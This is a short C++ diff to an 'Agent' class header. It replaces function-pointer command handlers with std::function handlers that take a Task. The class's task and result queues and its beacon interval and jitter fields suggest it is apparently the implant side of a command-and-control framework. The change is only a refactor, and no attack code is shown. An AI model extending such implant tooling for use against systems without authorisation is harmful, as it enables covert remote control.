@@ -1,6 +1,7 @@
 #pragma once
 #include <string>
 #include <atomic>
+#include <functional>
 #include <queue>
 #include <unordered_map>
 #include "Helpers.h"
@@ -36,14 +37,14 @@ private:
 	AgentMetadata Metadata;
 	std::queue<Task> Tasks;
 	std::queue<TaskResult> Results;
-	std::unordered_map<std::string, std::string(*)(std::vector<std::string> arguments)> Commands;
+	std::unordered_map<std::string, std::function<std::string(const Task&)>> Commands;
 	std::atomic<DWORD> BeaconIntervalMs;
 	std::atomic<DWORD> BeaconJitterMs;
 
 public:
 	Agent();
 
-	std::unordered_map<std::string, std::string(*)(std::vector<std::string> arguments)> loadCommands();
+	std::unordered_map<std::string, std::function<std::string(const Task&)>> loadCommands();
 
 	AgentMetadata generateMetadata();
 
